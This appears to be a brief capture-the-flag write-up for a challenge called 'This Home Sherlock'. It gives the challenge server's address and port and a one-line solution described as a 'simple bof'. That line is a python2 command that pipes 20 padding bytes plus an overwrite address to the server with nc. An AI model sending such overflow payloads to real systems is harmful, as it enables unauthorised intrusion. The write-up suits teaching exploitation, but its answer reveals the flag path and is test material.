This Home Sherlock, Please check on the server

nc 202.148.27.84 3452

Format Flag : redmask{flag}

# solution
simple bof
```
python2 -c 'print "A"*20+"\x1b\x22\xc0\x00"' | nc 202.148.27.84 3452
```